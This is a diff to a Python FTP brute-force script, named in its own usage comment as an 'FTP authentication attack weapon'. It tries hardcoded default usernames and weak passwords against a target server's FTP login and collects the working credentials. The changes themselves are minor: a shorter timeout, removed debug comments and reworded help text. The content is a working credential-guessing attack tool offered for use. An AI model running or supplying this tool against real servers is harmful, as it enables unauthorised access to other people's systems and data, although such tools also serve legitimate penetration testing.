@@ -14,18 +14,17 @@ ret['status'] = str()
 ret['info'] = list()
 
 # anonymous, ftp 开启匿名下可用
-# python ftp_login.py --target 10.0.4.143 --user ftp --pw guest
+# python FTP身份认证攻击武器.py --target 10.0.4.143 --user ftp --pw guest
 user_dict = ["anonymous", "root", "admin"]
 password_dict = ["anonymous", "root", "admin", "toor", "123456", "abc123", "QWE!@#"]
+
 
 def FTPLogin(target, username, password):
     try:
         f = ftplib.FTP(target)
-        f.connect(target, 21, timeout=5)
+        f.connect(target, 21, timeout=3)
         resp = f.login(username, password)
         if "Login successful" in resp:
-            # ret
-            # print("The userName is %s and password is %s" % (username, password))
             ret['status'] = 'success'
             ret['info'].append({'username': username, 'password': password})
         f.quit()
@@ -36,9 +35,9 @@ def FTPLogin(target, username, password):
 def main():
     usage = "Usage: %prog --target <target ip> --user <user name> --pw <password>"
     parse = OptionParser(usage=usage)
-    parse.add_option("-t", '--target', type="string", dest="target", help="ftp server target, e.g. 10.0.0.1")
-    parse.add_option("-u", '--user', type="string", dest="username", help="ftp login user name, e.g. root,guest ")
-    parse.add_option("-p", '--pw', type="string", dest="password", help="ftp login password, e.g. abc123, toor")
+    parse.add_option("-t", '--target', type="string", dest="target", help="ftp server ip, e.g. 10.0.0.1")
+    parse.add_option("-u", '--user', type="string", dest="username", help="ftp login user name, e.g. root, guest ")
+    parse.add_option("-p", '--pw', type="string", dest="password", help="ftp login password , e.g. abc123, toor")
     options, args = parse.parse_args()
 
     users = list()
